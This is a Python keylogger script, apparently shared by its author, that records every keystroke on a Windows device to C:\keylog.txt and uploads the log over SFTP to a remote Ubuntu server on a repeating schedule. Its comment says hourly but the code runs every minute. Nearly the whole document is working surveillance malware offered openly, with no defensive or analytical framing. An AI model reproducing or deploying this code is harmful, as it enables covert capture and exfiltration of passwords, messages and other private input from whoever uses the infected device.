#This script when running on a device will record your key strokes and send to an ubuntu server via ssh.

Edit: Taking out file names that are specific to my home device. 

import paramiko
import schedule
import time

from pynput.keyboard import Key, Listener

#Key log file path
file_path = "C:\\keylog.txt"

#SSH Connections
local_file_path = ''
remote_file_path = ''
server_address = ''
private_key_path = ''

with open(file_path, 'w'):
    pass  
#Function to write the key to a file
def on_press(key):
    with open(file_path, "a") as textfile:
        if key == Key.space:
            textfile.write(" ")
        elif key == Key.shift:
            pass
        elif key == Key.tab:
            textfile.write("    ")
        elif key == Key.backspace:
            pass
        elif key == Key.enter:
            textfile.write("\n")
        else:
            original_string = str(key)
            modified_string = original_string.replace("'", '')
            textfile.write(modified_string)

def transfer_file_to_server(local_path, remote_path, server_address, private_key_path):
    try:
        # Create an SSH client instance
        ssh_client = paramiko.SSHClient()

        # Automatically add the server's host key (this is insecure, ideally, verify the key)
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        private_key = paramiko.RSAKey.from_private_key_file(private_key_path)

        ssh_client.connect(server_address, username='elovell', pkey=private_key)

        sftp = ssh_client.open_sftp()

        #Transfer the file
        sftp.put(local_path, remote_path)

        print(f"File transferred successfully from {local_path} to {remote_path} on {server_address}")

        sftp.close()
        ssh_client.close()

    except Exception as e:
        print(f"File transfer failed: {str(e)}")

#Schedule file transfer for every hour
schedule.every(1).minutes.do(lambda: transfer_file_to_server(local_file_path, remote_file_path, server_address, private_key_path))

#Start the keylogger
listener = Listener(on_press=on_press)
listener.start()

while True:
    schedule.run_pending()
    time.sleep(1)
